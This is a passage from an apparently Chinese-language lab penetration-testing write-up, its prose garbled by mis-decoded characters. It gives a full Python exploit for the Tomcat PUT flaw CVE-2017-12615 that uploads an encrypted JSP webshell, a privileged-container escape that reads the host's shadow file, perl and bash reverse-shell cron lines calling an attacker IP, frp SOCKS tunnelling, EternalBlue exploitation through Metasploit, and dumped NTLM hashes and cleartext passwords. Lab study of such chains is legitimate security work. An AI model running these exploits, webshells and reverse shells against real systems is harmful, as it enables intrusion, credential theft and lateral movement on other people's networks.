class="hljs-comment">#CVE-2017-12615 EXP</span><br>__author__ = <span class="hljs-string">&#x27;çº¸æœº&#x27;</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> optparse<br><span class="hljs-keyword">import</span> time<br><br><br>parse = optparse.OptionParser(usage = <span class="hljs-string">&#x27;python3 %prog [-h] [-u URL] [-p PORT]&#x27;</span>)<br>parse.add_option(<span class="hljs-string">&#x27;-u&#x27;</span>,<span class="hljs-string">&#x27;--url&#x27;</span>,dest=<span class="hljs-string">&#x27;URL&#x27;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;target url&#x27;</span>)<br>parse.add_option(<span class="hljs-string">&#x27;-p&#x27;</span>,<span class="hljs-string">&#x27;--port&#x27;</span>,dest=<span class="hljs-string">&#x27;PORT&#x27;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;target port[default:8080]&#x27;</span>,default=<span class="hljs-string">&#x27;8080&#x27;</span>)<br><br>options,args = parse.parse_args()<br><span class="hljs-comment">#éªŒè¯å‚æ•°æ˜¯å¦å®Œæ•´</span><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> options.URL <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> options.PORT:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Usage:python3 CVE-2017-12615-POC.py [-u url] [-p port]\n&#x27;</span>)<br>        exit(<span class="hljs-string">&#x27;CVE-2017-12615-POC.py:error:missing a mandatory option(-u,-p).Use -h for basic and -hh for advanced help&#x27;</span>)<br><br>url = options.URL+<span class="hljs-string">&#x27;:&#x27;</span>+options.PORT<br>filename = <span class="hljs-string">&#x27;/backdoor.jsp&#x27;</span><br>payload = filename+<span class="hljs-string">&#x27;?pwd=023&amp;i=&#x27;</span><br><br>headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0&quot;</span>&#125;<br><span class="hljs-comment">#æœ¨é©¬</span><br>data = <span class="hljs-string">&#x27;&#x27;&#x27;&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#ä¸Šä¼ æœ¨é©¬æ–‡ä»¶</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>(<span class="hljs-params">url</span>):<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] ç›®æ ‡åœ°å€:&#x27;</span>+url)<br>  <span class="hljs-keyword">try</span>:<br>    respond = requests.put(url+filename+<span class="hljs-string">&#x27;/&#x27;</span>,headers=headers,data = data)<br>    <span class="hljs-comment">#print(respond.status_code)</span><br>    <span class="hljs-keyword">if</span> respond.status_code == <span class="hljs-number">201</span> <span class="hljs-keyword">or</span> respond.status_code == <span class="hljs-number">204</span>:<br>      <span class="hljs-comment">#print(&#x27;[*] ç›®æ ‡åœ°å€:&#x27;+url)</span><br>      <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] æœ¨é©¬ä¸Šä¼ æˆåŠŸ&#x27;</span>)<br>  <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[-] ä¸Šä¼ å¤±è´¥&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br><span class="hljs-comment">#å‘½ä»¤æ‰§è¡Œ</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>(<span class="hljs-params">url,cmd</span>):<br>  <span class="hljs-keyword">try</span>:<br>    respond = requests.get(url+payload+cmd)<br>    <span class="hljs-keyword">if</span> respond.status_code == <span class="hljs-number">200</span>:<br>      <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(respond.text).replace(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).strip())<br><br>  <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[-] å‘½ä»¤æ‰§è¡Œé”™è¯¯&#x27;</span>)<br><span class="hljs-keyword">if</span> upload(url) == <span class="hljs-number">0</span>:<br>        exit()<br>time.sleep(<span class="hljs-number">0.5</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;è¾“å…¥æ‰§è¡Œå‘½ä»¤(quité€€å‡º):&#x27;</span>)<br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>  cmd = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;&gt;&gt;&gt;&#x27;</span>)<br>  <span class="hljs-keyword">if</span>(cmd == <span class="hljs-string">&#x27;quit&#x27;</span>):<br>    <span class="hljs-keyword">break</span><br>  attack(url,cmd)<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python cve-2017-tomcat.py -u http://192.168.157.128 -p 2002<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241115232125447.png" alt="image-20241115232125447"></p><p>ç„¶åå†°èè¿æ¥</p><p><img src="https://cdn.clown2024.cn/image-20241115232227130.png" alt="image-20241115232227130"></p><p>çœ‹ä¸€ä¸‹åŸºæœ¬ä¿¡æ¯</p><p><img src="https://cdn.clown2024.cn/image-20241115232453454.png" alt="image-20241115232453454"></p><p>å¯ä»¥çœ‹åˆ°dockerç¯å¢ƒï¼Œä¹Ÿå¯ä»¥ç”¨ä¸‹é¢å‘½ä»¤åˆ¤æ–­</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">grep <span class="hljs-string">&#x27;docker&#x27;</span> /proc/1/cgroup<br></code></pre></td></tr></table></figure><h2 id="dockeré€ƒé€¸"><a href="#dockeré€ƒé€¸" class="headerlink" title="dockeré€ƒé€¸"></a>dockeré€ƒé€¸</h2><p>é¢˜ç›®è€ƒç‚¹æœ‰æåˆ°dockeré€ƒé€¸çš„çŸ¥è¯†ç‚¹ï¼Œé‚£å°±çœ‹ä¸€ä¸‹dockeré€ƒé€¸è¦æ€ä¹ˆåˆ©ç”¨ï¼Œå‚è€ƒï¼š<a href="https://wiki.teamssix.com/CloudNative/Docker/container-escape-check.html">https://wiki.teamssix.com/CloudNative/Docker/container-escape-check.html</a></p><p>çœ‹ä¸€ä¸‹æ˜¯å¦æ˜¯ç‰¹æƒæ¨¡å¼</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /proc/self/status | grep -qi <span class="hljs-string">&quot;0000003fffffffff&quot;</span> &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Is privileged mode&quot;</span> || <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Not privileged mode&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241115234729102.png" alt="image-20241115234729102"></p><p>æ ¹æ®æ–‡ç« æ£€æµ‹ä¸‹æ¥åªæœ‰ç‰¹æƒæ¨¡å¼èƒ½å¤Ÿåˆ©ç”¨ï¼Œå…¶ä»–æœåŠ¡å¯èƒ½ä¹Ÿå­˜åœ¨ï¼Œä½†è¿™é‡Œtomcatçš„æœåŠ¡åˆšå¥½èƒ½åˆ©ç”¨ï¼Œå°±ç»§ç»­è¿›è¡Œä¸‹å»</p><p>æŸ¥çœ‹æŒ‚è½½ç£ç›˜è®¾å¤‡</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">fdisk -l<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241115235254326.png" alt="image-20241115235254326"></p><p>åœ¨å®¹å™¨å†…éƒ¨æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œå°†å®¿ä¸»æœºæ–‡ä»¶æŒ‚è½½åˆ° &#x2F;test ç›®å½•ä¸‹</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> /test &amp;&amp; mount /dev/sda1 /test<br></code></pre></td></tr></table></figure><p>å°è¯•è®¿é—®å®¿ä¸»æœº shadow æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°æ­£å¸¸è®¿é—®</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /test/etc/shadow<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241115235506075.png" alt="image-20241115235506075"></p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å†™å…¥å®šæ—¶ä»»åŠ¡åå¼¹shellç„¶åæ‹¿åˆ°çš„æƒé™ä¹Ÿæ˜¯å®¿ä¸»æœºçš„rootæƒé™</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> $<span class="hljs-string">&#x27;* * * * * perl -e \&#x27;</span>use Socket;<span class="hljs-variable">$i</span>=<span class="hljs-string">&quot;192.168.157.129&quot;</span>;<span class="hljs-variable">$p</span>=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="hljs-string">&quot;tcp&quot;</span>));<span class="hljs-keyword">if</span>(connect(S,sockaddr_in(<span class="hljs-variable">$p</span>,inet_aton(<span class="hljs-variable">$i</span>))))&#123;open(STDIN,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);open(STDOUT,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);open(STDERR,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;/bin/sh -i&quot;</span>);&#125;;\&#x27;<span class="hljs-string">&#x27; &gt; /test/var/spool/cron/crontabs/root</span><br></code></pre></td></tr></table></figure><p>ä½†æ˜¯ä¸ºäº†æ–¹ä¾¿æ“ä½œè¿˜æ˜¯çœ‹ä¸€ä¸‹èƒ½ä¸èƒ½å†™sshå…¬é’¥æ¥è¿æ¥å§</p><p>å…ˆçœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰.sshæ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -name .ssh<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241116000516621.png" alt="image-20241116000516621"></p><p>å‘ç°äº†ubuntuçš„.sshæ–‡ä»¶åœ°å€</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/test/home/ubuntu/.ssh<br></code></pre></td></tr></table></figure><p>é‚£å°±å¯ä»¥å†™sshå…¬é’¥ç„¶åè¿œç¨‹ç™»å½•äº†</p><p>ç”Ÿæˆæœ¬åœ°å¯†é’¥å¯¹</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">ssh-keygen -t rsa<br></code></pre></td></tr></table></figure><p>ä»¥å‰ç”Ÿæˆè¿‡å¯ä»¥ç›´æ¥ç”¨</p><p><img src="https://cdn.clown2024.cn/image-20241116000827045.png" alt="image-20241116000827045"></p><p>å†™è¿›authorized_keys</p><p><img src="https://cdn.clown2024.cn/image-20241116001043435.png" alt="image-20241116001043435"></p><p>æ¬¸æˆ‘å»å¿˜è®°äº†è¿™æ˜¯ä»…ä¸»æœºæ¨¡å¼äº†ï¼Œæˆ‘termiusè¿ä¸äº†ï¼Œåªèƒ½ç”¨kaliçš„sshï¼Œè€Œä¸”æˆ‘è¯•äº†ä¸€ä¸‹è¿˜è¿ä¸ä¸Šå°±é€†å¤©ï¼Œè¿˜æ˜¯è¦æˆ‘è¾“å…¥å¯†ç ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯æˆ‘æ ¼å¼å†™é”™äº†ï¼ˆæˆ‘å‘ç°ç›´æ¥ä¼ ä¹Ÿä¸è¡Œï¼‰</p><p>é‚£å°±è¿˜æ˜¯åå¼¹shellå§</p><p><img src="https://cdn.clown2024.cn/image-20241116003807417.png" alt="image-20241116003807417"></p><p>æ€ªäº†ï¼Œå†™è¿›å»åˆå¼¹ä¸è¿‡æ¥äº†ï¼Œçº¢æ¸©äº†ğŸ˜¡</p><p>æ¢æˆbashå¼¹ä¸€ä¸‹çœ‹çœ‹</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;* * * * * bash -i &gt;&amp; /dev/tcp/192.168.157.129/8888 0&gt;&amp;1&quot;</span> &gt; /test/var/spool/cron/crontabs/root<br></code></pre></td></tr></table></figure><p>çº¢æ¸©äº†è¿˜æ˜¯ä¸è¡Œ</p><p>é‚£å°±åªèƒ½ç”¨johnå»çˆ†ä¸€ä¸‹å¯†ç äº†</p><p>æŠŠ&#x2F;etc&#x2F;shadowçš„å†…å®¹ä¿å­˜ä¸‹æ¥ï¼Œç„¶åç›´æ¥johnçˆ†ç ´</p><p><img src="https://cdn.clown2024.cn/image-20241116102516524.png" alt="image-20241116102516524"></p><p>è½»æ¾çˆ†å‡ºå¯†ç ä¸ºubuntuï¼Œç„¶åç”¨sshè¿œç¨‹ç™»å½•ä¸€ä¸‹</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">ssh ubuntu@192.168.157.128<br></code></pre></td></tr></table></figure><p>ç„¶åçœ‹ä¸€ä¸‹eth1çš„åœ°å€ä¿¡æ¯ï¼Œå°±æ˜¯å†…ç½‘åœ°å€çš„ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">ifconfig eth1<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241116111716201.png" alt="image-20241116111716201"></p><p>å¯ä»¥çŸ¥é“å†…ç½‘åœ°å€192.168.183.128</p><h2 id="struts2æ¼æ´"><a href="#Struts2æ¼æ´" class="headerlink" title="Struts2æ¼æ´"></a>Struts2æ¼æ´</h2><p>2001æ˜¯ä¸€ä¸ªstruts2æœåŠ¡ï¼Œç›´æ¥ä¸Šå·¥å…·ï¼š<a href="https://github.com/abc123info/Struts2VulsScanTools/releases/tag/v19.32">https://github.com/abc123info/Struts2VulsScanTools/releases/tag/v19.32</a></p><p>ç›´æ¥èƒ½æ‰«å‡ºrceæ¼æ´</p><p><img src="https://cdn.clown2024.cn/image-20241116230437845.png" alt="image-20241116230437845"></p><p>é‚£åˆ©ç”¨ä¹Ÿå¾ˆç®€å•ï¼Œå¹²å•¥éƒ½è¡Œäº†ï¼Œé©¬ä¹Ÿéšä¾¿ä½ ä¸Šä¼ ï¼Œå°±ä¸å¤šæ¼”ç¤ºäº†</p><h1 id="å†…ç½‘æ¸—é€"><a href="#å†…ç½‘æ¸—é€" class="headerlink" title="å†…ç½‘æ¸—é€"></a>å†…ç½‘æ¸—é€</h1><h2 id="frpåå‘ä»£ç†"><a href="#frpåå‘ä»£ç†" class="headerlink" title="frpåå‘ä»£ç†"></a>frpåå‘ä»£ç†</h2><p>ç°åœ¨æˆ‘ä»¬å‘¢å°±æ‹¿ä¸‹ä¸€å°è·³æ¿æœºäº†ï¼Œä¸ºäº†æ–¹ä¾¿é¡ºä¾¿ç†Ÿæ‚‰ä¸€ä¸‹frpï¼Œè¿™é‡Œæ­ä¸ªä»£ç†è¿›å»ï¼Œç„¶åå¯ä»¥ç›´æ¥æ‰«ä¸€ä¸‹å†…ç½‘</p><p>å‚è€ƒæ•™ç¨‹ï¼š<a href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/12.%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/03.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/03.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F.html">https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/12.%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/03.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/03.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F.html</a></p><p>å…ˆå°†æœ¬åœ°çš„frpä¸Šä¼ åˆ°ubuntuçš„æœºå™¨ä¸Šå»</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">scp -r frp ubuntu@192.168.157.128:/home/ubuntu/<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241116105558626.png" alt="image-20241116105558626"></p><blockquote><p>è¿™é‡Œæœ‰ç‚¹è¦æ³¨æ„ï¼Œä»–ä¸Šä¼ çš„æ—¶å€™ä¼šç›´æ¥æ‰¾ä½ å½“å‰ç›®å½•ä¸‹çš„frpç›®å½•ï¼Œæ‰€ä»¥å¦‚ä¸Šå›¾è¦ç°åœ¨ubuntuç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªfrpç›®å½•</p></blockquote><p>kaliçš„frpæœåŠ¡ç«¯é…ç½®frps.toml</p><figure class="highlight toml"><table><tr><td class="code"><pre><code class="hljs toml"><span class="hljs-attr">bindPort</span> = <span class="hljs-number">49378</span><br><span class="hljs-attr">auth.token</span> = <span class="hljs-string">&quot;helloxx.6haha7789&quot;</span><br><span class="hljs-comment">#portï¼Œtokenè‡ªå®šä¹‰ ä¿æŒå®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯ä¸€è‡´å³å¯</span><br></code></pre></td></tr></table></figure><p>ç„¶åå¯åŠ¨æœåŠ¡å™¨</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">./frps -c ./frps.toml<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241116110345584.png" alt="image-20241116110345584"></p><p>ubuntuçš„å®¢æˆ·ç«¯frpc.tomlé…ç½®</p><figure class="highlight toml"><table><tr><td class="code"><pre><code class="hljs toml"><span class="hljs-attr">serverAddr</span> = <span class="hljs-string">&quot;192.168.157.129&quot;</span> <span class="hljs-comment"># æ”¹ä¸º VPS çš„ IP åœ°å€</span><br><span class="hljs-attr">serverPort</span> = <span class="hljs-number">49378</span><br><span class="hljs-attr">auth.token</span> = <span class="hljs-string">&quot;helloxx.6haha7789&quot;</span><br><br><span class="hljs-section">[[proxies]]</span><br><span class="hljs-attr">name</span> = <span class="hljs-string">&quot;plugin_socks5&quot;</span><br><span class="hljs-attr">type</span> = <span class="hljs-string">&quot;tcp&quot;</span><br><span class="hljs-attr">remotePort</span> = <span class="hljs-number">60051</span><br><span class="hljs-section">[proxies.plugin]</span><br><span class="hljs-attr">type</span> = <span class="hljs-string">&quot;socks5&quot;</span><br><span class="hljs-attr">username</span> = <span class="hljs-string">&quot;0HDFt16cLQJCB&quot;</span><br><span class="hljs-attr">password</span> = <span class="hljs-string">&quot;JTN276Gp1A&quot;</span><br></code></pre></td></tr></table></figure><p>ç„¶åå¯åŠ¨å®¢æˆ·ç«¯</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">./frpc -c ./frpc.toml<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241116111031630.png" alt="image-20241116111031630"></p><p>ç„¶åç°åœ¨å°±èƒ½é€šè¿‡60051ç«¯å£èµ°socks5ä»£ç†è®¿é—®å†…ç½‘äº†</p><p>å†é…ç½®ä¸€ä¸‹proxychains4å·¥å…·çš„é…ç½®æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">vim /etc/proxychains4.conf<br></code></pre></td></tr></table></figure><p>é…ç½®</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">[ProxyList]<br># add proxy here ...<br># meanwile<br># defaults set to &quot;tor&quot;<br># socks4        127.0.0.1 9050<br># socks5  192.168.172.132 7777<br># socks5 127.0.0.1 8989<br>socks5 127.0.0.1 60051 0HDFt16cLQJCB JTN276Gp1A<br></code></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œä¸€å¼€å§‹socks5å¿˜è®°åŠ ä¸Šç”¨æˆ·åå’Œå¯†ç äº†ï¼Œå¯¼è‡´msfè®¿é—®çš„æ—¶å€™è¢«æ‹’ç»è¿æ¥äº†</p></blockquote><h2 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h2><p>é‚£å°±ç›´æ¥ä¸Šfscanæ‰«å†…ç½‘äº†</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">proxychains ./fscan -h 192.168.183.1/24<br></code></pre></td></tr></table></figure><p>æ‰«å‡ºçš„ä¿¡æ¯å¦‚ä¸‹ï¼š</p><p>å­˜æ´»ä¸»æœº</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">(icmp) Target 192.168.183.1   is alive<br>(icmp) Target 192.168.183.130 is alive<br>(icmp) Target 192.168.183.128 is alive<br>(icmp) Target 192.168.183.129 is alive<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å…¶ä»–ä¸¤å°çš„åœ°å€éƒ½æ‰«å‡ºæ¥äº†</p><p>ç«¯å£ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">192.168.183.128:22 open<br>192.168.183.1:7680 open<br>192.168.183.129:445 open<br>192.168.183.130:445 open<br>192.168.183.129:139 open<br>192.168.183.1:445 open<br>192.168.183.130:139 open<br>192.168.183.129:135 open<br>192.168.183.1:139 open<br>192.168.183.130:135 open<br>192.168.183.1:135 open<br>192.168.183.130:88 open<br></code></pre></td></tr></table></figure><p>æ¼æ´ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">[*]192.168.183.130<br>   [-&gt;]WIN-ENS2VR5TR3N<br>   [-&gt;]192.168.183.130<br>[*] NetInfo <br>[*]192.168.183.129<br>   [-&gt;]TESTWIN7-PC<br>   [-&gt;]192.168.183.129<br>[+] MS17-010 192.168.183.129    (Windows 7 Enterprise 7601 Service Pack 1)<br>[+] MS17-010 192.168.183.130    (Windows Server 2008 HPC Edition 7601 Service Pack 1)                   <br>[*] NetBios 192.168.183.130 [+] DC:WIN-ENS2VR5TR3N.demo.com      Windows Server 2008 HPC Edition 7601 Service Pack 1<br></code></pre></td></tr></table></figure><p>win7çš„ä¸»æœºæœ‰MS17-010æ°¸æ’ä¹‹è“æ¼æ´ï¼ŒwinServer2008åº”è¯¥æ˜¯åŸŸæ§ä¹Ÿæœ‰ä¸€ä¸ªæ°¸æ’ä¹‹è“</p><p>é‚£å°±å…ˆæ‰“win7å§ç›´æ¥</p><h2 id="æ‰“win7"><a href="#æ‰“win7" class="headerlink" title="æ‰“win7"></a>æ‰“win7</h2><p>é€šè¿‡porxychainså¯åŠ¨msf</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">proxychains msfconsole<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241116174820036.png" alt="image-20241116174820036"></p><p>ç„¶åä¸Šæ°¸æ’ä¹‹è“çš„æ‰«ææ¨¡å—è¯•ä¸€ä¸‹ï¼Œä¸»è¦æ˜¯æµ‹è¯•èƒ½ä¸èƒ½é€š</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">use auxiliary/scanner/smb/smb_ms17_010<br><span class="hljs-built_in">set</span> rhost 192.168.183.129<br>run<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241116175834529.png" alt="image-20241116175834529"></p><p>å¯ä»¥çœ‹åˆ°æ˜¯æˆåŠŸæ‰«å‡ºæ¥äº†ms17-010ï¼Œé‚£å°±ç›´æ¥å¼€æ‰“ï¼</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">use exploit/windows/smb/ms17_010_eternalblue<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp <span class="hljs-comment">#å› ä¸ºä¸»æœºåœ¨å†…ç½‘ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œéœ€è¦ç”¨æ­£å‘çš„shell</span><br><span class="hljs-built_in">set</span> target Windows\ 7<br><span class="hljs-built_in">set</span> RHOSTS 192.168.183.129<br><span class="hljs-built_in">set</span> rhost 192.168.183.129<br>run<br></code></pre></td></tr></table></figure><p>ä¸€é¡¿è¶…æ—¶ä¹‹åç»ˆäºæ˜¯æ‹¿åˆ°äº†meterpreter</p><p><img src="https://cdn.clown2024.cn/image-20241116180809503.png" alt="image-20241116180809503"></p><p>getuidçœ‹ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/image-20241116180833768.png" alt="image-20241116180833768"></p><p>æ¬¸å‘ç°å·²ç»æ˜¯SYSTEMæƒé™äº†</p><p>é‚£å°±ç›´æ¥ä¸åŒææƒäº†ï¼Œç›´æ¥å¸¸è§„å…ˆæ‹¿ä¸€ä¸‹è´¦å·å¯†ç ä¹‹ç±»çš„ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">load kiwi<br>creds_all<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">msv credentials<br>===============<br><br>Username      Domain  NTLM                              SHA1<br>--------      ------  ----                              ----<br>TESTWIN7-PC$  DEMO    e3ba914bdaca29c197c7191ebf521873  68a1422322c303e4c24d63f381a03b34eb434477<br>douser        DEMO    bc23b0b4d5bf5ff42bc61fb62e13886e  c48096437367aad00ac2dc70552051cd84912a55<br><br>wdigest credentials<br>===================<br><br>Username      Domain  Password<br>--------      ------  --------<br>(null)        (null)  (null)<br>TESTWIN7-PC$  DEMO    /-LDA[1d hf-tfj)O)yNyCgh[o#D[h7I/*-&#x27;ShnKX%X7`wWWdrLDd`!EUceLQ8:y!J?TD5KY*iuQ32i8<br>                      He_D#JyWDWIzuYDDytr)\J7(_e(Fctsjl.Zd&quot;JRr<br>douser        DEMO    Dotest123<br><br>kerberos credentials<br>====================<br><br>Username      Domain    Password<br>--------      ------    --------<br>(null)        (null)    (null)<br>douser        DEMO.COM  (null)<br>testwin7-pc$  demo.com  /-LDA[1d hf-tfj)O)yNyCgh[o#D[h7I/*-&#x27;ShnKX%X7`wWWdrLDd`!EUceLQ8:y!J?TD5KY*iuQ32<br>                        i8He_D#JyWDWIzuYDDytr)\J7(_e(Fctsjl.Zd&quot;JRr<br>testwin7-pc$  DEMO.COM  /-LDA[1d hf-tfj)O)yNyCgh[o#D[h7I/*-&#x27;ShnKX%X7`wWWdrLDd`!EUceLQ8:y!J?TD5KY*iuQ32<br>                        i8He_D#JyWDWIzuYDDytr)\J7(_e(Fctsjl.Zd&quot;JRr<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">hashdump<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>testclone:1001:aad3b435b51404eeaad3b435b51404ee:8d8e04036d33ed20f5c2f6ad77e28bb7:::<br></code></pre></td></tr></table></figure><p>é‚£ç°åœ¨win7å°±æ‹¿ä¸‹äº†ï¼Œä½†æ˜¯æˆ‘æƒ³shellè·å¾—cmdçª—å£ä¸€ç›´ä¸è¡Œä¸çŸ¥é“ä¸ºä»€ä¹ˆ</p><p><img src="https://cdn.clown2024.cn/image-20241116183521507.png" alt="image-20241116183521507"></p><p>åˆä¸€ç›´å‡ºç°æ‹’ç»è¿æ¥äº†</p><p>èšŒåŸ ä½äº†æˆ‘æ›´æ–°äº†msfæƒ³é‡æ–°æ‰“è¯•è¯•çš„ï¼Œç»“æœç›´æ¥ç»™win7æ‰“è“å±å’Œæ­»æœºäº†</p><p>åæ¥å¯ä»¥ä¹‹åä»–è¿˜æ˜¯æ‹¿ä¸åˆ°cmd</p><p><img src="https://cdn.clown2024.cn/image-20241116203423166.png" alt="image-20241116203423166"></p><p>åé¢è¿˜æƒ³å°†msfæ´¾ç”Ÿåˆ°csä¸Šé¢ï¼Œä½†æ˜¯ä¸ä¼šæ´¾ç”Ÿæ­£å‘çš„shellï¼Œæˆ‘çœ‹ç½‘ä¸Šå¤§éƒ¨åˆ†éƒ½æ˜¯å…ˆcsä¸Šçº¿äº†ä¸€å°ä¸»æœºç„¶ååˆ›å»ºä¸­è½¬ç›‘å¬çš„ï¼Œæ²¡æ‰¾åˆ°ç›´æ¥æ´¾ç”Ÿæ­£å‘shellçš„</p><h2 id="æ‰“åŸŸæ§"><a href="#æ‰“åŸŸæ§" class="headerlink" 